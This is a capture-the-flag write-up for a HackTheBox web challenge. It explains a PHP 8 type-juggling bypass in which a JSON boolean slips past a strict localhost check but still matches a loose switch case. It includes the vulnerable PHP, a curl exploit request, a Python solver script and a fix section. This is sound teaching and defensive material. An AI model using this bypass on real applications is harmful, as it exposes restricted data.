---
title: "Juggling facts"
date: 2026-10-07 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, php, type-juggling, loose-comparison, auth-bypass]
description: "A Very Easy Web challenge: a PHP 8 API gates its secret fact behind a strict === localhost check but dispatches on the same value with a loose == switch. Send a JSON boolean and the strict gate is skipped while the loose switch still matches - a textbook type-juggling auth bypass that leaks the flag remotely."
---

## Overview

`Juggling facts` is a Very Easy HackTheBox **Web** challenge. A small PHP 8 app serves
"pumpkin facts" from a MySQL table over a single `POST /api/getfacts` endpoint. Facts come
in three types - `spooky`, `not_spooky`, and the privileged `secrets` type that holds the
flag. The `secrets` type is supposed to be reachable only from `localhost`, but a mismatch
between a strict and a loose comparison on the same attacker-controlled value lets a remote
client walk straight past that check. This is a classic [PHP type juggling](https://cwe.mitre.org/data/definitions/1287.html) auth bypass.

## The technique

The endpoint validates the requested `type` in two different ways:

```php
public function getfacts($router)
{
    $jsondata = json_decode(file_get_contents('php://input'), true);

    // GATE - strict comparison (===)
    if ($jsondata['type'] === 'secrets' && $_SERVER['REMOTE_ADDR'] !== '127.0.0.1')
    {
        return $router->jsonify(['message' => 'Currently this type can be only accessed through localhost!']);
    }

    // DISPATCH - switch uses loose comparison (==)
    switch ($jsondata['type'])
    {
        case 'secrets':     return $router->jsonify(['facts' => $this->facts->get_facts('secrets')]);
        case 'spooky':      ...
        case 'not_spooky':  ...
    }
}
```

The localhost gate uses **strict** `===`: it only fires when `type` is *exactly* the string
`'secrets'`. The `switch`, however, uses PHP's **loose** `==`, so `case 'secrets'` matches
anything that loosely equals `'secrets'`.

Because the body is parsed by `json_decode`, the client controls the *type* of `type`. Send a
JSON **boolean**:

| Payload | `type === 'secrets'` (gate) | `type == 'secrets'` (switch) | Result |
|---|---|---|---|
| `{"type":"secrets"}` | true -> gate fires | - | blocked (localhost only) |
| `{"type":true}` | **false** -> gate skipped | **true** (non-empty string is truthy) | **secret returned** |

`true === 'secrets'` is false (different types), so the localhost check never runs. But
`switch(true)` evaluates `true == 'secrets'`, and in PHP a non-empty string is truthy, so
`true == true` matches the `secrets` case. The flag comes back to a remote attacker.

### Why not the classic `0` trick?

The challenge Dockerfile pins **php8**. On PHP 8 the historic `0 == "secrets"` juggling is
**dead** - an int compared to a non-numeric string is now compared *as strings*
(`"0" != "secrets"`). On PHP 7 `{"type":0}` would also work here, but on PHP 8 the **boolean**
is the portable primitive: `true == <any non-empty string>`.

## Solution

One request is enough:

```bash
curl -s http://TARGET:PORT/api/getfacts -H 'Content-Type: application/json' -d '{"type":true}'
# {"facts":[{"id":19,"fact":"HTB{...}","fact_type":"secrets"}]}
```

The durable solver, `solve.py`:

```python
import sys, requests

def solve(base):
    r = requests.post(f"{base}/api/getfacts", json={"type": True}, timeout=15)
    for f in r.json().get("facts", []):
        if f.get("fact_type") == "secrets":
            return f["fact"]
    raise SystemExit(f"no secret returned: {r.json()}")

if __name__ == "__main__":
    print(solve(sys.argv[1].rstrip("/")))
```

```bash
python3 solve.py http://TARGET:PORT
# HTB{...}
```

## Why it worked

Strict (`===`) and loose (`==`) equality exist precisely *because they disagree* on
type-coerced operands. A codebase that guards a value with one and dispatches on it with the
other has a latent gap: pick an input type that the strict check rejects but the loose check
accepts. A JSON parser - which preserves booleans, numbers, and arrays - is what makes that
gap reachable from the network. Here, the boolean `true` is rejected by the strict
`=== 'secrets'` gate (so the localhost guard is skipped) yet accepted by the loose
`== 'secrets'` switch (so the secret branch runs).

## Fix / defense

- Use **strict** comparison everywhere the value is security-relevant - both the gate and the
  dispatch.
- **Validate the type** before comparing - reject anything that isn't a string.
- Match the case with an unambiguous string compare such as `strcmp($in['type'], 'secrets') === 0`.

```php
if (!is_string($jsondata['type'])) { return $router->jsonify(['message' => 'Invalid type!']); }
if ($jsondata['type'] === 'secrets' && $_SERVER['REMOTE_ADDR'] !== '127.0.0.1') { /* block */ }
```
